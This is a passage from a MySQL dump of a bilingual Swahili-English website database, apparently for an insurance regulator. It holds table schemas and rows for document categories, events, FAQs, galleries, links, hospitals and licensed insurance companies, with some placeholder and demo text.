  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `featured` tinyint(1) NOT NULL DEFAULT 0,
  `specials` int(11) DEFAULT NULL,
  `services` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `document_categories`
--

INSERT INTO `document_categories` (`id`, `title_sw`, `title_en`, `slug`, `active`, `created_at`, `updated_at`, `featured`, `specials`, `services`) VALUES
(7, 'Insurance Regulations', 'Insurance Regulations', 'insurace-regulations', 1, '2021-09-14 09:36:38', '2022-08-09 17:03:58', 0, NULL, NULL),
(8, 'Miongozo', 'Guidelines', 'guidelines', 1, '2021-09-14 09:38:57', '2022-08-09 17:05:19', 0, NULL, NULL),
(9, 'Licensing Requirements', 'Licensing Requirements', 'licensing-requirements', 1, '2021-10-13 06:40:40', '2022-08-09 17:07:16', 1, NULL, NULL),
(10, 'Insurance licensing Brokers', 'Insurance licensing Brokers', 'insurance-licensing-brokers', 1, '2022-08-07 10:46:18', '2022-08-07 10:46:18', 1, NULL, NULL),
(11, 'Insurance Licensing Company', 'Insurance Licensing Company', 'insurance-licensing-company', 1, '2022-08-07 10:47:39', '2022-08-07 10:47:39', 1, NULL, NULL),
(12, 'Circulars', 'Circulars', 'circular', 1, '2022-08-07 10:51:17', '2022-08-09 17:06:15', 0, NULL, NULL),
(13, 'Quarterly Market Performance Report', 'Quarterly Market Performance Report', 'quarterly-market-performance-report', 1, '2022-08-07 10:52:10', '2022-08-07 10:52:10', 0, NULL, NULL),
(14, 'Presentation | Papers  | speeches', 'Presentation | Papers  | speeches', 'presentation-papers-speeches', 1, '2022-08-07 10:52:50', '2022-08-07 10:53:00', 0, NULL, NULL),
(15, 'Insurance Act', 'Insurance Act', 'insurance-act', 1, '2022-08-07 10:53:29', '2022-08-07 10:53:29', 0, NULL, NULL),
(16, 'Insurance Policy', 'Insurance Policy', 'insurance-policy', 1, '2022-08-07 10:54:14', '2022-08-09 17:04:28', 0, NULL, NULL),
(17, 'Micro Insurance Regulations', 'Micro Insurance Regulations', 'micro-insurance-regulations', 1, '2022-08-07 10:54:38', '2022-08-07 10:54:38', 1, NULL, NULL),
(18, 'Magazines', 'Magazines', 'magazines', 1, '2022-08-09 17:45:16', '2022-08-09 17:45:16', 0, NULL, NULL),
(19, 'Reports', 'Reports', 'reports', 1, '2022-08-10 05:21:27', '2022-08-10 05:21:27', 0, NULL, NULL),
(20, 'Accreditation of Foreign Reinsurance', 'Accreditation of Foreign Reinsurance', 'accreditation-of-foreign-reinsurance', 1, '2022-08-13 07:02:45', '2022-08-13 07:02:45', 1, NULL, NULL),
(21, 'Accreditation of Foreign Reinsurance Brokers', 'Accreditation of Foreign Reinsurance Brokers', 'accreditation-of-foreign-reinsurance-brokers', 1, '2022-08-13 07:04:36', '2022-08-13 07:04:36', 1, NULL, NULL),
(22, 'Insurance Agents Licensing', 'Insurance Agents Licensing', 'insurance-agents-licensing', 1, '2022-08-13 07:06:00', '2022-08-13 07:06:00', 1, NULL, NULL),
(23, 'Insurance Digital Platform', 'Insurance Digital Platform', 'insurance-digital-platform', 1, '2022-08-14 16:01:52', '2022-08-14 16:01:52', 1, NULL, NULL),
(24, 'Magazine', 'Magazine', 'magazine', 1, '2022-08-24 09:10:44', '2022-08-24 09:10:44', 0, NULL, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `events`
--

CREATE TABLE `events` (
  `id` int(10) UNSIGNED NOT NULL,
  `event_date` date DEFAULT NULL,
  `event_time` varchar(18) COLLATE utf8mb4_unicode_ci NOT NULL,
  `location` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL,
  `contact` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `summary_sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `summary_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `content_sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `content_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `user_id` int(11) NOT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `photo_url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `events`
--

INSERT INTO `events` (`id`, `event_date`, `event_time`, `location`, `contact`, `title_sw`, `title_en`, `summary_sw`, `summary_en`, `content_sw`, `content_en`, `active`, `user_id`, `slug`, `photo_url`, `created_at`, `updated_at`) VALUES
(1, '2021-08-13', '11:00AM - 2:30PM', 'Nkrumah Hall', NULL, 'Changes in Second Stakeholders General Meeting', 'Changes in Second Stakeholders General Meeting', '', NULL, '<p>Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting</p>', '<p>Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting</p>', 1, 1, 'changes-in-second-stakeholders-general-meeting', '5f0814d557088a67edbbe7b8a2ea1fa5.jpeg', '2021-08-02 03:28:10', '2021-08-02 03:28:10'),
(2, '2021-08-19', '11:00AM - 2:30PM', 'Nkrumah Hall', NULL, 'Changes in Second Stakeholders General Meeting', 'Changes in Second Stakeholders General Meeting', '', NULL, '<p>Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting</p>', '<p>Changes in Second Stakeholders General Meeting Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting</p>', 1, 1, 'changes-in-second-stakeholders-general-meeting-2', '19c85af6feaf700d95b0653f677ebdf9.jpeg', '2021-08-02 03:30:48', '2021-08-02 03:30:48'),
(3, '2021-08-20', '11:00AM - 2:30PM', 'Nkrumah Hall', 'Dr. Jane John Doe, janedoe@mail.com, 255 754 998 764', 'Mkutano wa Wawekezaji', 'Investors Meeting', '', NULL, '<p>Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting</p>', '<p>Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;</p>', 1, 1, 'changes-in-second-stakeholders-general-meeting-3', 'e153ca773f33545712009cb3b44d8680.jpeg', '2021-08-02 03:32:16', '2022-03-10 04:33:59'),
(4, '2021-08-12', '11:00AM - 2:30PM', 'Nkrumah Hall', NULL, 'Changes in Second Stakeholders General Meeting', 'Changes in Second Stakeholders General Meeting', '', NULL, '<p>Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting</p>', '<p>Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting</p>', 1, 1, 'changes-in-second-stakeholders-general-meeting-4', '93179b6450b24999094300288cd655a4.jpeg', '2021-08-02 03:34:28', '2021-08-02 03:34:28'),
(5, '2022-02-07', '07:00AM - 12:30PM', 'KarimJee, Dar es Salaam', 'GBT, info@gbt.go.tz', 'Demo Menu', 'Demo News', '', NULL, '<p>bjnknj</p>', '<p>jllnm</p>', 1, 1, 'demo-news', '53f114f1c69175b8f7b88ea9c1a9596b.jpeg', '2022-02-07 09:19:44', '2022-03-10 04:31:24');

-- --------------------------------------------------------

--
-- Table structure for table `faqs`
--

CREATE TABLE `faqs` (
  `id` int(10) UNSIGNED NOT NULL,
  `question_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `question_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `answer_sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `answer_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `active` tinyint(1) NOT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `specials` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `faqs`
--

INSERT INTO `faqs` (`id`, `question_sw`, `question_en`, `answer_sw`, `answer_en`, `active`, `slug`, `created_at`, `updated_at`, `specials`) VALUES
(4, 'What is Risk Management?', 'What is Risk Management?', '<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Answer:</p>\r\n\r\n<p><em>Risk management is the identification, analysis and economic control of those risks which can threaten the assets or earning capacity of an enterprise.</em></p>\r\n\r\n<p>&nbsp;</p>', '<p>Answer:</p>\r\n\r\n<p><em>Risk management is the identification, analysis and economic control of those risks which can threaten the assets or earning capacity of an enterprise.</em></p>\r\n\r\n<p>&nbsp;</p>', 1, 'what-is-risk-management', '2022-08-11 11:13:11', '2022-08-11 11:13:11', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `galleries`
--

CREATE TABLE `galleries` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_sw` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `title_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `content_sw` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `content_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `type` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `featured` tinyint(1) NOT NULL DEFAULT 1,
  `status` tinyint(1) NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `galleries`
--

INSERT INTO `galleries` (`id`, `title_sw`, `title_en`, `content_sw`, `content_en`, `type`, `slug`, `featured`, `status`, `created_at`, `updated_at`) VALUES
(1, 'slideshow', 'slideshow', 'slideshow', 'slideshow', 'photos', 'slideshow', 1, 1, '2021-07-30 09:06:50', '2022-08-13 20:30:35'),
(3, 'Picha Nzuri', 'Good Picha', 'picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana', 'picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana', 'photos', 'good-picha', 0, 1, '2021-08-04 03:00:22', '2022-08-13 20:30:35'),
(4, 'Video za Matukio', 'Trending Videos', 'All the good clips are available here on the website .', 'All the good clips are available here on the website', 'videos', 'hot-trending-videos', 0, 1, '2021-08-04 03:26:00', '2022-08-24 10:50:12');

-- --------------------------------------------------------

--
-- Table structure for table `google_maps`
--

CREATE TABLE `google_maps` (
  `id` int(10) UNSIGNED NOT NULL,
  `url` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `office_id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `google_maps`
--

INSERT INTO `google_maps` (`id`, `url`, `office_id`, `user_id`, `created_at`, `updated_at`) VALUES
(9, '<iframe src=\"https://www.google.com/maps/embed?pb=!1m14!1m8!1m3!1d15846.492258314473!2d39.2817001!3d-6.815617!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x76503dfba83b084!2sTanzania%20Insurance%20Regulatory%20Authority%20(TIRA)!5e0!3m2!1sen!2stz!4v1659882719508!5m2!1sen!2stz\" width=\"600\" height=\"450\" style=\"border:0;\" allowfullscreen=\"\" loading=\"lazy\" referrerpolicy=\"no-referrer-when-downgrade\"></iframe>', 1, 1, '2022-08-07 11:32:43', '2022-08-07 11:32:43');

-- --------------------------------------------------------

--
-- Table structure for table `home_links`
--

CREATE TABLE `home_links` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `link` tinyint(1) NOT NULL DEFAULT 0,
  `url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `url_external` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `link_type` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `home_links`
--

INSERT INTO `home_links` (`id`, `title_sw`, `title_en`, `link`, `url`, `url_external`, `active`, `link_type`, `slug`, `created_at`, `updated_at`) VALUES
(1, 'Programu', 'Programme', 0, 'https://mail.ega.go.tz', 'https://mail.ega.go.tz', 1, 'fa-list', 'programme', '2022-02-24 06:02:44', '2022-02-24 06:20:50'),
(3, 'Kozi za Muda Mfupi', 'Short Courses', 1, 'announcements', NULL, 1, 'fa-book-open', 'short-courses', '2022-02-24 06:23:25', '2022-02-24 06:23:25');

-- --------------------------------------------------------

--
-- Table structure for table `hospitals`
--

CREATE TABLE `hospitals` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `contact` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `address` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `phone` varchar(161) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `parent` int(11) NOT NULL DEFAULT 0,
  `position` int(11) NOT NULL DEFAULT 1
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `hospitals`
--

INSERT INTO `hospitals` (`id`, `name`, `contact`, `address`, `email`, `phone`, `slug`, `active`, `created_at`, `updated_at`, `parent`, `position`) VALUES
(3, 'Muhimbili Hospital', 'TPSF', '<p>Executive Director<br />\r\nMuhimbili National Hospital,<br />\r\nP.O Box 65000,<br />\r\nDar es Salaam.</p>', 'info@mnh.or.tz', '+255-22-2151367-9', 'f', 1, '2021-07-28 06:17:24', '2022-06-25 03:32:53', 0, 2),
(5, 'Aga Khan Hospital', 'Viwanda na Biashara', '<p>P.O. Box 2289<br />\r\nOcean Road<br />\r\nDar es Salaam<br />\r\nTANZANIA</p>', 'info@khanorg.com', '+255 22 211 5151/53', 'o', 1, '2021-07-28 06:18:04', '2022-06-25 03:29:56', 0, 5),
(6, 'TMJ', 'TNBP', '<p>TMJ Hospital, Mwaikibaki Road, Mikocheni, Dar es Salaam<br />\r\nTanzania</p>', 'tmjhospital.co.tz', '+255222775517', 'p', 1, '2021-07-28 06:18:36', '2022-06-25 03:10:24', 0, 1),
(7, 'Masana Hospital', NULL, '<p>P.O BOX 65561, Dar es Salaam Tanzania</p>', 'info@masana.com', '+255 22 2627177', 'masana-hospital', 1, '2022-06-25 03:29:24', '2022-06-25 04:04:41', 0, 1);

-- --------------------------------------------------------

--
-- Table structure for table `how_do_i`
--

CREATE TABLE `how_do_i` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `content_sw` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `content_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `user_id` int(11) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `how_do_i`
--

INSERT INTO `how_do_i` (`id`, `title_sw`, `title_en`, `content_sw`, `content_en`, `active`, `slug`, `user_id`, `created_at`, `updated_at`) VALUES
(4, 'How do I apply for a teaching position?', 'How do I apply for a teaching position?', '<p><strong>Lorem Ipsum</strong>&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.</p>', '<p><strong>Lorem Ipsum</strong>&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.</p>', 1, 'how-do-i-apply-for-a-teaching-position', 1, '2021-12-01 03:17:10', '2021-12-01 03:17:10'),
(5, 'How Do I get a License?', 'How Do I get a License?', '<p>How Do I get a License explained ....</p>', '<p>How Do I get a License explained</p>', 1, 'how-do-i-get-a-license', 1, '2022-02-14 10:18:43', '2022-02-14 10:18:54'),
(6, 'How do I apply for a teaching position?', 'How do I apply for a teaching position?', '<p><strong>Lorem Ipsum</strong>&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.</p>', '<p><strong>Lorem Ipsum</strong>&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.</p>', 1, 'how-do-i-apply-for-a-teaching-position', 1, '2021-12-01 03:17:10', '2021-12-01 03:17:10');

-- --------------------------------------------------------

--
-- Table structure for table `ict_links`
--

CREATE TABLE `ict_links` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `link` tinyint(1) NOT NULL DEFAULT 0,
  `url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `url_external` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `parent` int(11) NOT NULL DEFAULT 0,
  `position` int(11) NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `ict_links`
--

INSERT INTO `ict_links` (`id`, `title_sw`, `title_en`, `link`, `url`, `url_external`, `active`, `parent`, `position`, `created_at`, `updated_at`) VALUES
(1, 'Staff Portals', 'Staff Portals', 0, 'https://mail.ega.go.tz', 'https://mail.ega.go.tz', 1, 0, 1, '2022-02-22 10:16:25', '2022-02-22 10:16:54'),
(2, 'Student Portal', 'Student Portal', 1, 'announcements', NULL, 1, 0, 1, '2022-02-22 10:17:24', '2022-02-22 10:17:24');

-- --------------------------------------------------------

--
-- Table structure for table `important_links`
--

CREATE TABLE `important_links` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `parent` int(11) NOT NULL DEFAULT 0,
  `position` int(11) NOT NULL DEFAULT 1
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `important_links`
--

INSERT INTO `important_links` (`id`, `title_sw`, `title_en`, `url`, `active`, `created_at`, `updated_at`, `parent`, `position`) VALUES
(1, 'MoF', 'MoF', 'http://mof.go.tz', 1, '2021-07-28 06:16:15', '2022-08-10 01:57:14', 0, 1),
(3, 'TRA', 'TRA', 'http://tra.go.tz', 1, '2021-07-28 06:17:24', '2022-08-10 01:57:14', 0, 2),
(4, 'ZRB', 'ZRB', 'http://zanrevenue.org', 1, '2021-07-28 06:17:43', '2022-08-10 01:57:14', 0, 3),
(6, 'NIDA', 'NIDA', 'http://nida.go.tz', 1, '2021-07-28 06:18:36', '2022-08-10 01:57:14', 0, 4),
(7, 'ZCSRA', 'ZCSRA', 'https://zcsra.go.tz/', 1, '2021-10-13 08:18:42', '2022-08-10 01:57:14', 0, 5),
(8, 'BRELA', 'BRELA', 'https://brela.go.tz', 1, '2021-07-28 06:16:15', '2022-08-10 01:57:14', 0, 6),
(9, 'BPRA', 'BPRA', 'https://bpra.go.tz', 1, '2021-07-28 06:17:24', '2022-08-10 01:57:14', 0, 7),
(10, 'LATRA', 'LATRA', 'https://latra.go.tz', 1, '2021-07-28 06:17:43', '2022-08-10 01:57:14', 0, 8),
(11, 'Police Force', 'Police Force', 'https://police.go.tz', 1, '2021-07-28 06:18:36', '2022-08-10 01:57:14', 0, 9);

-- --------------------------------------------------------

--
-- Table structure for table `licensed_entities`
--

CREATE TABLE `licensed_entities` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `phone` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `telephone` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `email` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `region` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `address` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `principal_officer` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `fax` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `class_of_business` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `website` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `license_type` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `category_id` int(11) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `licensed_entities`
--

INSERT INTO `licensed_entities` (`id`, `name`, `phone`, `telephone`, `email`, `region`, `address`, `principal_officer`, `fax`, `class_of_business`, `website`, `license_type`, `active`, `slug`, `category_id`, `created_at`, `updated_at`) VALUES
(2, 'Thorn', '069226104', '+255 22 2122121', 'thorn.limited@yahoo.com', 'Dar es salaam', 'NIC Life House Sokoine/ohio Street, 6th Floor P.O. Box 10177 DAR ES SALAAM', 'A.S. Balisidya', '+255 22 2122105', NULL, '', NULL, 1, 'mnazi-juuu-kusini', 7, '2022-06-30 20:47:08', '2022-08-07 08:01:10'),
(3, 'Assemble Insurance Tanzania Limited', '255 767 111260', '+255 022 2780020 | +255 022 2780651', 'info@aar.co.tz', 'Dar es salaam', 'AAR Insurance (T) Ltd Plot 74 Serengeti Road, Warioba Street Off Mwai Kibaki Road, Mikocheni P.O Box 9600, Dar Es Salam', 'Ms. Violet Mordichai', '+255 022 2781472 | +255 022 2781204', 'Non-Life', 'http://aar-insurance.com', 'Perpetual', 1, 'mnazi-juuu-kusini', 9, '2022-06-30 20:47:08', '2022-08-28 03:47:16'),
(5, 'Equity Insurance Brokers Ltd', '+255 754 264559', NULL, 'infor@equityinsurancebrokers.co.tz', 'Dar es salaam', '5th floor Luther House, Sokoine Drive P.O. Box 2900 DAR ES SALAAM', 'Mr. Octavian Temu', NULL, 'Non-Life', NULL, 'Perpetual', 1, 'equity-insurance-brokers-ltd', 7, '2022-08-07 07:57:34', '2022-08-07 07:57:34'),
(6, 'MIC', '+255 777 52555 5', '+255 22 2120433', 'smmaherali@micglobalrisks.com', 'Dar es salaam', '8th Floor, Amani Place Ohio Street P.O. Box 10936 DAR ES SALAAM', 'Mr. Shiraz M. Maherali', NULL, NULL, NULL, NULL, 1, 'mic', 7, '2022-08-07 07:58:34', '2022-08-07 07:58:34'),
(8, 'MEJU INSURANCE SURVEYORS AND LOSS ASSESSORS', NULL, NULL, NULL, 'Dar es salaam', 'DAR', 'TBA', NULL, 'Non-Life', NULL, NULL, 0, 'meju-insurance-surveyors-and-loss-assessors-2', 10, '2022-08-07 08:06:04', '2022-08-07 08:06:04'),
(9, 'Eagle Surveyors and Loss Assessors', '0765 453940', NULL, 'eagleadjusters@gmail.com', 'Dar es salaam', 'P.O. Box 42466, EAGT Building Bohari Street, Plot No. 1, 2nd Floor Room 274 Temeke - Dar es salaam', 'Samson Andongisye Mwamakula', NULL, NULL, NULL, NULL, 1, 'eagle-surveyors-and-loss-assessors', 10, '2022-08-07 08:08:17', '2022-08-07 08:08:17'),
(12, 'Alliance Insurance Corporation Limited', '+255 754 780050/714 041155', '0411200104', 'admin@alliance.co.tz', 'Dar es salaam', 'Ghana Avenue 7th floor EXIM Tower P.O. Box 9942 DAR ES SALAAM.', 'Mr. K.V. Krishnan', '+255 22 2139098', 'Non-Life', 'www.alliance.co.tz', 'Perpetual', 1, 'alliance-insurance-corporation-ltd', 9, '2022-08-13 04:14:51', '2022-08-28 03:42:17'),
(13, 'Britam Insurance Tanzania Limited', '+255 22 213 8058', '+255 22 213 8058 /212 9384-7', 'info@britam.com', 'Dar es salaam', '2nd Floor PPF Towers Ohio Street/Ghana Avenue P.O. Box 75433 DAR ES SALAAM', 'Mr. Raymond Komanga', '+255 22 213 8059', 'Non-Life', 'www.Britam.co.tz', 'Perpetual', 1, 'britam-insurance-tanzania-ltd', 9, '2022-08-13 04:40:10', '2022-08-28 03:30:21'),
